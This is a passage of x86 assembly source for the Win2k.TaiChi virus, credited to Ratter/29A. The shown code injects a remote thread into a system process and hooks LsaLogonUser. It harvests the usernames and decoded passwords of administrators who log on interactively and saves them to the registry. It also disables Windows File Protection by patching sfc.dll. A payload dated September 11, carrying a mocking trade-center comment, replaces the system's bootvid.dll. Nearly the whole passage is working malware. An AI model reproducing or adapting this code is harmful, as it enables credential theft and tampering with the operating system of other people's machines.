	loop infect_winlogon_search

infect_winlogon_free_mem:
	push edi
	call free_mem

	xor eax, eax
	call se_debug_privilege
infect_winlogon_end:
	@SEH_RemoveFrame
	popad
	leave
	retn
infect_winlogon_	endp

infiltrate_lsalogonuser	proc	near	process_handle:DWORD
        local	temp:DWORD

        pushad

	mov ecx, 300
	call $+10
	db	5eh, 0c9h, 0c2h, 38h, 00h
	; pop esi
	; leave
	; retn 38h
	pop esi
	mov edi, dword ptr [ebx+tLsaLogonUser]

infiltrate_loop:
	pushad
	push 5
	pop ecx
	rep cmpsb
	popad
	jz infiltrate_found

	inc edi
	loop infiltrate_loop
	jmp infiltrate_end
infiltrate_found:

	mov eax, dword ptr [ebx+delta_offset]
	add eax, offset lsa_logon_user_patch_addr
	mov dword ptr [eax], edi

	@pushvar <dd	?>
	push 4
	lea eax, [temp]
	push eax
	push edi
        push dword ptr [process_handle]
        call dword ptr [ebx+tReadProcessMemory]

        cmp dword ptr [temp], 38c2c95eh
        jnz infiltrate_end

        push PAGE_READWRITE
	push MEM_RESERVE or MEM_COMMIT
	push (end_remote_routine-start_remote_routine)+apiz_size
	push 0
	push dword ptr [process_handle]
	call dword ptr [ebx+tVirtualAllocEx]
	test eax,eax
	jz infiltrate_end
	xchg eax, edi

	push 0
	push end_remote_routine-start_remote_routine

	; Infiltration routine start
	call infiltrate_next
start_remote_routine	equ	$
        pushad
	@SEH_SetupFrame_ <call unprotect>, <mov esp,[esp.EH_EstablisherFrame]>, <jmp remote_routine_end>

        @gimme_delta

	lea edx, [ebp+lsa_logon_user_hook] 
	mov edi, 12345678h
lsa_logon_user_patch_addr	equ	$-4

	sub edx, edi
	sub edx, 5

	mov byte ptr [edi], 0e9h
	mov dword ptr [edi+1], edx

	call sfp_disable

remote_routine_end:
	@SEH_RemoveFrame
        popad
	retn

sfp_disable:
	@pushsz	"sfc.dll"
        call dword ptr [ebp+end_remote_routine+tGetModuleHandleA]
	test eax,eax
	jz sfp_disable_end
	xchg eax,esi

	mov eax, dword ptr [esi.MZ_lfanew]
	add eax, esi
	movzx edx, word ptr [eax.NT_FileHeader.FH_SizeOfOptionalHeader]
	lea edx, [edx+eax+(3*IMAGE_SIZEOF_FILE_HEADER)]
	mov ecx, dword ptr [edx.SH_SizeOfRawData]

	call sfp_disable_end_
sfp_disable_start	equ	$
	db	6ah, 00h, 6ah, 01h, 6ah, 01h
	db	0ffh, 33h, 0ffh, 73h, 04h
	db	0ffh, 15h
sfp_disable_end_:
	pop edi

sfp_disable_find:
	pushad
	push sfp_disable_end_-sfp_disable_start
	pop ecx
	rep cmpsb
	popad
	jz sfp_disable_found

	inc esi
	loop sfp_disable_find
	jmp sfp_disable_end
sfp_disable_found:
	push dword ptr [ebp+end_remote_routine+tExitThread]
	pop dword ptr [ebp+exit_thread]

        call sfp_disable_patch_end
sfp_disable_patch_start	equ	$
	push 0
	mov eax, 12345678h
exit_thread	equ	$-4
	call eax

sfp_disable_patch_end:
	pop edi
	xchg esi, edi
	add edi, 15

	push sfp_disable_patch_end-sfp_disable_patch_start
	pop ecx
        rep movsb
sfp_disable_end:
        retn

unprotect	proc	near
	mov eax, dword ptr [esp+4+EH_ExceptionRecord]
	cmp dword ptr [eax], EXCEPTION_ACCESS_VIOLATION
	jz $+3
	retn

	pop eax
        pushad

	@gimme_delta
	mov ebx, dword ptr [esp+cPushad+EH_ExceptionRecord]

        @pushvar <dd	?>
	mov ebx, dword ptr [ebx.ER_ExceptionInformation+4]
	push PAGE_READWRITE
	and ebx, 0fffff000h
	push 2*4096
	push ebx
        call dword ptr [ebp+end_remote_routine+tVirtualProtect]

        popad
        xor eax, eax
        retn
unprotect	endp

lsa_logon_user_hook	proc	near
	pop esi
        leave

	test eax, eax
	jnz lsa_logon_user_hook_end_

	pushad
	@SEH_SetupFrame <jmp lsa_logon_user_hook_end>

	@gimme_delta

	mov esi, dword ptr [esp+8+cPushad+4+16]	; AuthenticationInformation

	cmp dword ptr [esi], 2			; InteractiveLogon ?
	jnz lsa_logon_user_hook_end

	@pushvar <net_buf_ptr	dd	?>
	push 1
	push dword ptr [esi+16]
	push 0
	call dword ptr [ebp+end_remote_routine+tNetUserGetInfo]
	test eax, eax
	jnz lsa_logon_user_hook_end

	mov eax, dword ptr [ebp+net_buf_ptr]
	push dword ptr [eax+12]

        push eax
        call dword ptr [ebp+end_remote_routine+tNetApiBufferFree]

        pop eax
        cmp eax, USER_PRIV_ADMIN
        jnz lsa_logon_user_hook_end

	mov ebx, dword ptr [esp+8+cPushad+4+20]	; AuthenticationInformationLength  
	mov ecx, ebx
	add ecx, 300

	push ecx
	push GMEM_ZEROINIT
	call dword ptr [ebp+end_remote_routine+tGlobalAlloc]
	test eax, eax
	jz lsa_logon_user_hook_end
	xchg eax, edi

	pushad
	mov ecx, ebx
	rep movsb
	popad

	mov eax, dword ptr [esi+24]
	sub eax, esi
	add eax, edi
	mov dword ptr [edi+24], eax

        movzx eax, byte ptr [edi+21]
	xor byte ptr [edi+21], al
	lea edx, [edi+20]
	push edx
	push eax
	call dword ptr [ebp+end_remote_routine+tRtlRunDecodeUnicodeString]

	push edi
	mov edx, esi
	mov ecx, edi
	xor eax, eax

	lea edi, [edi+ebx]
	mov esi, dword ptr [edx+16]
	@unicode_to_asciiz

	mov dword ptr [ebp+value_data], edi

	mov esi, dword ptr [ecx+24]
        mov edx, edi
	@unicode_to_asciiz
	sub edi, edx
	mov edx, edi
        pop edi

        ; ok we've got an admin account so store it to registry ...
        push edx
        @pushvar <reg_handle	dd	?>
        @pushsz "Software\29A\TaiChi"
        push HKEY_LOCAL_MACHINE
        call dword ptr [ebp+end_remote_routine+tRegCreateKeyA]
        pop edx
        test eax, eax
        jnz lsa_logon_free_mem

        push edx
        push 12346578h
value_data	equ	$-4
	push REG_SZ
	push eax
	lea eax, [edi+ebx]
	push eax
	mov ebx, dword ptr [ebp+reg_handle]
	push ebx
        call dword ptr [ebp+end_remote_routine+tRegSetValueExA]

	push ebx
        call dword ptr [ebp+end_remote_routine+tRegCloseKey]
lsa_logon_free_mem:
	push edi
	call dword ptr [ebp++end_remote_routine+tGlobalFree]
lsa_logon_user_hook_end:
        @SEH_RemoveFrame
	popad
lsa_logon_user_hook_end_:
	retn 38h
lsa_logon_user_hook	endp
end_remote_routine	equ	$

infiltrate_next:
	; Infiltration routine end

	push edi
	push dword ptr [process_handle]
	call dword ptr [ebx+tWriteProcessMemory]
	dec eax
	jnz infiltrate_free_mem

	push 0
	push apiz_size
	push ebx
	lea eax, [edi+end_remote_routine-start_remote_routine]
	push eax
	push dword ptr [process_handle]
	call dword ptr [ebx+tWriteProcessMemory]
	dec eax
	jnz infiltrate_free_mem

	push eax
	push eax
	push eax
	push edi
	push eax
	push eax
	push dword ptr [process_handle]
	call dword ptr [ebx+tCreateRemoteThread]
	xchg eax, ecx
	jecxz infiltrate_free_mem
	push ecx
	call dword ptr [ebx+tCloseHandle]

	jmp infiltrate_end
infiltrate_free_mem:
	push MEM_RELEASE
	push 0
	push edi
	push dword ptr [process_handle]
	call dword ptr [ebx+tVirtualFreeEx]
infiltrate_end:
	popad
        leave
        retn 4
infiltrate_lsalogonuser	endp

; in: esi - privilege to touch
;     eax - disable/enable
; out: eax - bool
touch_privilege:
	mov ebx, ebp
touch_privilege_	proc	near
	local	process_token:DWORD
	local	privilege_luid:QWORD
	local	token_privilegez:TOKEN_PRIVILEGES

	pushad
	@SEH_SetupFrame <jmp touch_privilege_end>

	xchg eax, edi

	call dword ptr [ebx+tGetCurrentProcess]
	lea edx, [process_token]
	push edx
	push TOKEN_ADJUST_PRIVILEGES
	push eax
	call dword ptr [ebx+tOpenProcessToken]
	dec eax
	jnz touch_privilege_end

	lea edx, [token_privilegez.TP_luid]
	push edx
	push esi
	push eax
	call dword ptr [ebx+tLookupPrivilegeValueA]
	dec eax
	jnz touch_privilege_close_p_token

	push eax
	push eax
	push type(TOKEN_PRIVILEGES)
	lea edx, [token_privilegez]

	push 1
	pop dword ptr [edx]
	mov dword ptr [edx.TP_attribz], edi

	push edx
	push eax
	push dword ptr [process_token]
	call dword ptr [ebx+tAdjustTokenPrivileges]

touch_privilege_close_p_token:
	push eax
	push dword ptr [process_token]
	call dword ptr [ebx+tCloseHandle]
	pop eax
touch_privilege_end:
	@SEH_RemoveFrame
	mov dword ptr [esp.Pushad_eax], eax
	popad
	leave
	retn
touch_privilege_	endp

taichi_payload:
	mov ebx, ebp
taichi_payload_	proc	near
	local	system_time:SYSTEMTIME
	local	path:DWORD
	local	temp:DWORD

        pushad
	@SEH_SetupFrame	<jmp taichi_payload_end>

	lea eax, [system_time]
	push eax
	call dword ptr [ebx+tGetLocalTime]

	cmp word ptr [system_time.ST_Month], 9
	jnz taichi_payload_end
	cmp word ptr [system_time.ST_Day], 11
	jnz taichi_payload_end
	; All your trade center are belong to us :))

        push 4
	lea eax, [temp]
	push eax
	push 1
	@pushvar <dd	4>
	push eax
	@pushvar <dd	?>
	@pushsz "TaiChi"
	@pushsz "Software\29A\TaiChi\PayLoad"
	pop eax
	mov dword ptr [path], eax
	push eax
	call dword ptr [ebx+tSHRegGetUSValueA]

	cmp dword ptr [temp], "TAR"
	jz taichi_payload_end

	mov eax, 2*MAX_PATH
	call alloc_mem
	xchg eax, edi

	push edi
	push MAX_PATH
	call dword ptr [ebx+tGetCurrentDirectoryA]
	test eax, eax
	jz taichi_payload_free_mem

	push MAX_PATH
	lea esi, [edi+MAX_PATH]
	push esi
	@pushsz "%systemroot%\system32"
	call dword ptr [ebx+tExpandEnvironmentStringsA]
	test eax, eax
	jz taichi_payload_free_mem

	push esi
	call dword ptr [ebx+tSetCurrentDirectoryA]
	test eax, eax
	jz taichi_payload_free_mem

	push 1
	@pushsz "bootvid_.dll"
	pop esi
	push esi
	@pushsz "bootvid.dll"
	pop eax
	mov dword ptr [temp], eax
	push eax
	call dword ptr [ebx+tCopyFileA]
	test eax, eax
	jz taichi_payload_set_curdir_back

        call taichi_payload_next
bootvid_dll_struc_start	equ	$
	dd	bootvid_dll_size
	dw	bootvid_dll_start-bootvid_dll_struc_start

	db	"bootvid.dl_", 0
	db	"bootvid.dll", 0
bootvid_dll_start	equ	$
        include	bootvid.dl_.inc
bootvid_dll_size	equ	$-bootvid_dll_start
taichi_payload_next:
	pop ecx
	call lz_decompress
	jnc taichi_payload_allz_ok

	push MOVEFILE_REPLACE_EXISTING
	push dword ptr [temp]
	push esi
	call dword ptr [ebx+tMoveFileExA]
	jmp taichi_payload_set_curdir_back

taichi_payload_allz_ok:
        push SHREGSET_FORCE_HKLM
	push 3
	@pushsz "RAT"
	push REG_SZ
	@pushsz "TaiChi"
	push dword ptr [path]
	call dword ptr [ebx+tSHRegSetUSValueA]

taichi_payload_set_curdir_back:
	push edi
	call dword ptr [ebx+tSetCurrentDirectoryA]
taichi_payload_free_mem:
	push edi
	call free_mem
taichi_payload_end:
	@SEH_RemoveFrame
	popad
        leave
	retn
taichi_payload_	endp

; in: ecx - lz_decompress_structure
lz_decompress	proc	near
	local	of_struc:OFSTRUCT

	pushad
	@SEH_SetupFrame <jmp lz_decompress_end>

	mov esi, ecx
	add ecx, 6

	xor eax, eax
	push eax
	push eax
	push CREATE_ALWAYS
	push eax
	push eax
	push GENERIC_WRITE or GENERIC_READ
	push ecx
	call dword ptr [ebx+tCreateFileA]
	inc eax
	stc
	jz lz_decompress_end
	dec eax
	xchg eax, edi

	movzx edx, word ptr [esi+4]
	push 0
	@pushvar <dd	?>
	add edx, esi
	push dword ptr [esi]
	push edx
	push edi
	call dword ptr [ebx+tWriteFile]

        push eax
	push edi
	call dword ptr [ebx+tCloseHandle]
	pop ecx
	stc
	jecxz lz_decompress_delete

	lea eax, [esi+6]
	push OF_READ
	lea edx, [of_struc]
	push edx
	push eax
	call dword ptr [ebx+tLZOpenFileA]
	or eax, eax
	stc
	js lz_decompress_delete
	xchg eax, edi

	push esi
	lea esi, [esi+6]
	@endsz

	push OF_WRITE or OF_CREATE
	lea edx, [of_struc]
	push edx
	push esi
	call dword ptr [ebx+tLZOpenFileA]
	or eax, eax
	stc
	pushfd
	js lz_decompress_close_dst
	popfd
	xchg eax, esi

        push esi
	push edi
	call dword ptr [ebx+tLZCopy]
	or eax, eax
	sets ah
	sahf

	pushfd
	push esi
	call dword ptr [ebx+tLZClose]
lz_decompress_close_dst:
	push edi
	call dword ptr [ebx+tLZClose]
	popfd
	pop esi

lz_decompress_delete:
	pushfd
	lea eax, [esi+6]
	push eax
	call dword ptr [ebx+tDeleteFileA]
	popfd
lz_decompress_end:
        lahf
	@SEH_RemoveFrame
	sahf
	popad
	leave
	retn
lz_decompress	endp

host_start:
	push 0
	@pushsz "[Win2k.TaiChi] by Ratter/29A"
	@pushsz "First generation has been runned rite now ... :)"
	push 0
	calle MessageBoxA

	push 0
	calle ExitProcess
	
	db	0, "Virus_size: "
	db	"0" + virus_size/10000 mod 10
	db	"0" + virus_size/1000 mod 10
        db      "0" + virus_size/100 mod 10
	db      "0" + virus_size/10 mod 10
	db      "0" + virus_size/1 mod 10
	db	" bytez", 0

end	taichi_start
